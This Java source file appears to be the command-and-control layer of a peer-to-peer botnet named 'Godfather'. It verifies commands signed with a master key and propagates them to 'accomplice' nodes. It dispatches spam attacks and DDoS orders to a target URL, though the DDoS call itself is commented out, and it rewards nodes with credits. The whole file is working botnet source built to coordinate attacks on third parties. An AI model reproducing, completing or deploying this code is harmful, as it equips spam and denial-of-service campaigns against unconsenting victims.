package godfather.communication;

import godfather.Godfather;
import godfather.commands.RunCommand;
import godfather.commands.SendSPAM;
import godfather.communication.accomplice.Accomplice;
import godfather.communication.accomplice.AccomplicesStorage;
import godfather.localCommunication.PeersMsg;
import godfather.localCommunication.PeersMsgTypes;

import java.security.PublicKey;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import org.apache.log4j.Logger;

import rice.p2p.commonapi.Id;



/** Recebe todos os PeerMsg e coloca-os nos pacotes de CipherMsg */
public class CommunicationAPI {

    public final AccomplicesStorage accomplicesStorage;
    private final Godfather godfather;
    private final MessageExchanger exchanger;

    private final List<PendentMsg> pendentDelivery;

    private final HashMap<PublicKey, Long> commandNounceReceived;

    static Logger logger = Logger.getLogger(CommunicationAPI.class);


    public CommunicationAPI(Godfather godfather) {
        this.godfather = godfather;
        accomplicesStorage = new AccomplicesStorage(godfather);
        exchanger = new MessageExchanger(godfather, "msgExchanger", this);
        pendentDelivery = new ArrayList<PendentMsg>();
        commandNounceReceived = new HashMap<PublicKey, Long>();
    }

    /**
     * Envio de uma mensagem para um destino especifico. Se não tiver a chave, coloca a
     * mensagem em espera e pede a chave ao destino. Quando o destino responder, elimina a
     * mensagem.
     * 
     * @param msg
     * @throws Exception
     */
    public void sendCommand(PeersMsg msg, Id destination) {
        PublicKey targetPublicKey;
        try {
            targetPublicKey = accomplicesStorage.getPublicKey(destination);
        } catch (Exception e) {
            e.printStackTrace();
            // Save this msg until receive the public key of destination, when receive,
            // call this again
            logger.info("sendCommand: Destination public key doesnt exists. Asking....");
            PendentMsg pendent = new PendentMsg(msg, destination);
            pendentDelivery.add(pendent);
            accomplicesStorage.findPublicKey(destination);
            return;
        }
        if (targetPublicKey == null) {
            logger.info("Cand send command to null public key destination");
            throw new RuntimeException("Cand send command to null public key destination");
        }

        logger.info("Sending message to destination");
        // Send message, we know the destination key
        exchanger.sendMessage(msg, destination, targetPublicKey);
    }



    /**
     * Receive a message make a clone to send to each destination. If no accomplices,
     * store it and wait for more accomplices.
     * 
     * @param msg
     */
    public void broadcastCommand(PeersMsg msg) {
        if (accomplicesStorage.getAccomplicesList().size() == 0) {
            logger.info("I don't have accomplices, store msg and let's flirk");
            accomplicesStorage.findAccomplices();
            PendentMsg pendent = new PendentMsg(msg, null);
            pendentDelivery.add(pendent);
            return;
        }
        for (Accomplice accomplice : accomplicesStorage.getAccomplicesList()) {
            sendCommand(msg, accomplice.id);
        }
    }

    public void start() {
        accomplicesStorage.start();
    }



    /**
     * O módulo de troca de chaves notificou que recebeu uma chave, verificar se há
     * mensagens pendentes para esse destino porque neste momento já é nosso amigo.
     * 
     * @param idDestinationID
     */
    public void notifyNewPublicKeyArrive(Id fromNodeID, PublicKey senderPublicKey) {
        for (PendentMsg pendent : pendentDelivery) {
            if (pendent.destination == null) {
                broadcastCommand(pendent.msgPendent);
            } else {
                if (pendent.destination.equals(fromNodeID)) {
                    // Send message, we know the destination key
                    exchanger.sendMessage(pendent.msgPendent, pendent.destination, senderPublicKey);
                }
            }
        }
    }



    /**
     * Update the nounce map
     * 
     * @param publicKey - source public key
     * @param nounce - last nounce from this source
     * @return true if is a new nounce
     */
    private boolean updateNounce(PublicKey publicKey, long newNounce) {
        logger.debug("newNounce:" + newNounce);
        Long lastNounce = commandNounceReceived.get(publicKey);
        if (lastNounce == null) {
            commandNounceReceived.put(publicKey, newNounce);
            return true;
        }
        if (lastNounce < newNounce) {
            commandNounceReceived.put(publicKey, newNounce);
            return true;
        }
        return false;
    }







    /**
     * Recebeu uma mensagem do exterior, converte para local e depois aqui cada um faz o
     * que quer
     * 
     * @param msg
     * @param source
     * @throws Exception
     */
    public void receiveCommand(PeersMsg msg, Id source) throws Exception {
        msg = verifyAndDecipherCommand(msg, source);

        String order = msg.order;

        System.out.println(order);

        switch (msg.msgType) {
        case DDoS:
            try {
                logger.info("Send DDOS" + order);
                String[] orders = order.split("#");

                // Long duration = Long.parseLong(orders[1]);
                String url = orders[0];
                System.out.println("ATTAAAAACK!!!!!! " + url);
                // DenialOfServiceGet.attack(url, duration);
            } catch (Exception e) {
                e.printStackTrace();
            }

            break;
        case Spam:
            logger.info("Send Spam" + order);
            String[] orderspam = order.split("#");


            SendSPAM spamAttack = new SendSPAM(orderspam[0], orderspam[1], orderspam[2], orderspam[3], orderspam[4]);
            RunCommand spamRunner = new RunCommand(spamAttack);
            spamRunner.start();
            break;
        default:
            logger.info("Invalid Order" + order);
            return;
        }
        broadcastCommand(msg);
    }

    public PeersMsg verifyAndDecipherCommand(PeersMsg msg, Id source) throws Exception {
        PeersMsgTypes type = msg.msgType;
        String order = msg.order;

        logger.info(msg.msgType + " Received");
        if (msg.signature == null) {
            throw new Exception("Not signed " + msg.msgType + " Command");
        }

        PublicKey masterKey = godfather.getGodSecurityManager().getMASTERCert().getPublicKey();
        try {
            msg.verifySignatureIsValid(masterKey);
        } catch (Exception e) {
            e.printStackTrace();
            throw new Exception("Signature not valid");
        }

        // This is a valid nouce, save it
        X509Certificate cert = msg.clientCertificate;
        boolean validNounce;
        if (cert == null) {
            validNounce = updateNounce(masterKey, msg.nounce);
        } else {
            validNounce = updateNounce(msg.clientCertificate.getPublicKey(), msg.nounce);
        }

        if (!validNounce) {
            throw new Exception("This message has been received already");
        }

        accomplicesStorage.addCredits(source);
        return msg;
    }








}
